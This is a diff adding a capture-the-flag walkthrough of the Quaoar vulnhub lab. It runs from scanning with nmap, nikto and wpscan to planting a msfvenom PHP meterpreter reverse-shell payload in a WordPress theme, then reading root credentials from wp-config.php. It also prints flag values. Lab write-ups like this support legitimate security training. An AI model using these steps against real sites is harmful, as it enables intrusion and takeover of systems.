@@ -1,0 +1,72 @@
+
+Hack the Quaoar VM (CTF Challenge)
+
+Once again we are with the vulnhub labs tutorial; this article is related to CTF lab where you will face three challenges to complete the task. This lab is pretty good for beginner as they have to seize only three flag: 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box. You can download it from here.
+LET’S BEGIN!!!
+ Now scan particular IP with version scan using Nmap tool as given in the image.
+nmap -sV 192.168.0.122
+Here it point up the open ports and running services on it. As shown port 22, 53, 80, 445 and etc. are open.
+
+Since port 80 is open therefore let explore target IP: 192.168.1.122 on the browser. From screenshot you can see I have not got any remarkable thing from here.
+
+Later I had used nikto for complete scan and here you can see it has shown robots.txt contains two entries from the highlighted text in the given screenshot.
+
+Again I move towards browser to explore roborts.txt here I found wordpress as one of the entry in it.
+
+Further I look around following path: 192.168.0.122/wordpress in browser where I found a wordpress administrator console.
+
+To breach administrator console of the wordpress we can use WPscan tool; now type following command to start wpsan enumeration.
+wpscan –url http://192.168.0.122/wordpress/ –enumerate u
+
+At last I have received two users name from it scanning result, now use admin credential for login inside the wordpress.  
+
+Accordingly under admin console we can upload any theme, taking advantage of admin’s right we will try to upload malicious script to achieve reverse connection from victim’s system. Now use msfvenom to generate malicious PHP script and type following command.
+msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.0.122 lport=4444 –f raw
+ From screenshot you can read the generated PHP script, at this instant we need to copy the text from *<?php……….die();  further we will past it inside wordpress template as a new theme.
+
+Now past above copied PHP text *<?php……….die();   here as new theme under selected 404.php template.
+
+On other hand Load metasploit framework and start multi/handler
+
+When you will execute your uploaded theme in browser you will receive reverse connection at multi/handler and get meterpreter session of victim’s system.
+
+Here form screenshot you can see through meterpreter we have access victim’s shell.
+Meterpreter> sysinfo
+Meterpreter>shell
+Hence our first task is completed!!
+
+Now type following command to obtain flag:-
+cd /home
+ls
+cd wpadmin
+ls
+cat flag.txt
+2bafe61f03117ac66a73c3c514de796e (1st flag)
+
+Now dig up more to achieve next flag so that we can complete second challenge also.
+ls
+cd www
+cd wordpress 
+ls
+cat wp-config.php
+
+Wp-config.php file helps me in achieving second task of this lab this file contains MYSQL Setting where I found credential for user root. If you will notice given below screenshot you can also read the username as well as its password (root: rootpassword)
+
+Now try to login for root privilege by typing following
+su
+rootpassword
+
+Great!!! We have completed second challenge also.
+cd root
+ls
+cat flaf.txt
+8e3f9ec016e3598c5eec11fd3d73f6fb (2nd flag)
+
+After many efforts I enrolled in etc where I found one more directory cron.d then I penetrate more inside and luckily capture third flag also and beat all three challenges.
+cd cron.d
+ls
+cat php5
+d46795f84148fd338603d0d6a9dbf8de (3rd flag)
+ Boo-yah!  We have successfully captured all 3 flags.
+
+Rajat Chikara is An Ethical Hacker, Cyber Security Expert, Penetration Tester, India.
